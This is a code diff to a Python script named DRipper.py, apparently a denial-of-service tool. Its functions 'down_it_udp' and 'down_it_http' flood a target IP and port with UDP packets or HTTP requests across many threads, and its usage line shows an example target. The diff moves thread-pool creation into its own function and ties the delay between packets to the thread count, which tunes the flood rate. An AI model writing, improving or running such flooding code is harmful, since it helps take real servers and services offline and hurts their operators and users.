@@ -16,6 +16,9 @@ EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
 GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"
 
 
+lock = threading.Lock()
+
+
 @dataclass
 class Context:
     """Class for passing a context to a parallel processes."""
@@ -93,7 +96,7 @@ def get_random_port():
     return random.choice(ports)
 
 
-def down_it_udp(_ctx):
+def down_it_udp(_ctx: Context):
     i = 1
     while True:
         extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''
@@ -127,7 +130,7 @@ def down_it_udp(_ctx):
                 thread = threading.Thread(target=connect_host, args=[_ctx])
                 thread.daemon = True
                 thread.start()
-        time.sleep(.01)
+        time.sleep(_ctx.threads*0.0001)
 
 
 def down_it_http(_ctx: Context):
@@ -145,7 +148,7 @@ def down_it_http(_ctx: Context):
             # print('\033[92m HTTP-Request was done \033[0;0m')
 
         _ctx.packets_sent += 1
-        time.sleep(.01)
+        time.sleep(_ctx.threads*0.0001)
 
 
 def logo():
@@ -246,6 +249,18 @@ def show_statistics(_ctx: Context):
     sys.stdout.flush()
 
 
+def create_thread_pool(_ctx: Context) -> list:
+    thread_pool = []
+    for i in range(int(_ctx.threads)):
+        if _ctx.attack_method == 'udp':
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+        elif _ctx.attack_method == 'http':
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        thread_pool[i].daemon = True  # if thread is exist, it dies
+        thread_pool[i].start()
+    return thread_pool
+
+
 def main():
     """The main function to run the script from the command line."""
     parser = OptionParser(usage=USAGE, epilog=EPILOG)
@@ -265,15 +280,7 @@ def main():
     print("\033[94mPlease wait...\033[0m")
 
     time.sleep(3)
-
-    thread_pool = []
-    for i in range(int(_ctx.threads)):
-        if _ctx.attack_method == 'udp':
-            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
-        elif _ctx.attack_method == 'http':
-            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
-        thread_pool[i].daemon = True  # if thread is exist, it dies
-        thread_pool[i].start()
+    create_thread_pool(_ctx)
 
     while True:
         show_statistics(_ctx)
